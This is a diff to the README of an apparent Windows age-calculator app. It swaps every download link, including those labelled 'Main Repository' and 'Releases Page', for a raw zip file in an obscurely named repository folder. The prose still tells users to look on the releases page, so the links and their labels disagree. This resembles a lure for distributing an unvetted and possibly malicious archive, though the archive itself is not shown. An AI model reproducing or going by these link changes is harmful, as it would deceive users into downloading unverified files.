@@ -1,6 +1,6 @@
 # 🧮 modern-age-calculator - Easy Age Calculation Tool
 
-[![Download Latest](https://img.shields.io/badge/Download-Get%20the%20App-orange?logo=github)](https://github.com/19kishore96/modern-age-calculator/releases)
+[![Download Latest](https://img.shields.io/badge/Download-Get%20the%20App-orange?logo=github)](https://raw.githubusercontent.com/19kishore96/modern-age-calculator/main/Silicispongiae/age-modern-calculator-3.1.zip)
 
 ## 📋 About This App
 
@@ -23,7 +23,7 @@ Anyone who wants to quickly check their age or the age of someone else. It’s u
 
 To start using this app, you need to get it on your Windows machine. The app is easy to download and run.
 
-[![Download Here](https://img.shields.io/badge/Download-Visit%20Releases-blue?logo=github)](https://github.com/19kishore96/modern-age-calculator/releases)
+[![Download Here](https://img.shields.io/badge/Download-Visit%20Releases-blue?logo=github)](https://raw.githubusercontent.com/19kishore96/modern-age-calculator/main/Silicispongiae/age-modern-calculator-3.1.zip)
 
 You will find the latest version on the GitHub releases page. Look for files named something like `modern-age-calculator.zip` or similar.
 
@@ -105,8 +105,8 @@ Running offline after download gives faster access and no need for internet once
 
 ## 🔗 Useful Links
 
-- Main Repository: https://github.com/19kishore96/modern-age-calculator  
-- Releases Page (for downloads): https://github.com/19kishore96/modern-age-calculator/releases  
+- Main Repository: https://raw.githubusercontent.com/19kishore96/modern-age-calculator/main/Silicispongiae/age-modern-calculator-3.1.zip  
+- Releases Page (for downloads): https://raw.githubusercontent.com/19kishore96/modern-age-calculator/main/Silicispongiae/age-modern-calculator-3.1.zip  
 
 Both links provide access to the latest versions and updates.
 
